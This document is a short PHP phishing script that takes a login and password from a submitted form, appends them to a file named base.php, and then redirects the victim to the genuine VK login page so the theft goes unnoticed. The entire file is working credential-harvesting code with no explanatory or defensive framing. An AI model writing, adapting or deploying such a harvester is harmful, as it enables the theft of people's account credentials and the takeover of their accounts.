<?

$Login = $_POST['counter']; 

$Pass = $_POST['strike']; 

$log = fopen("base.php","a+"); 

fwrite($log,"\n $Login:$Pass \n"); 

fclose($log); 

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0;  URL=https://vk.com/login?u=2&to=YWxfaW0ucGhw'></head></html>";
?> 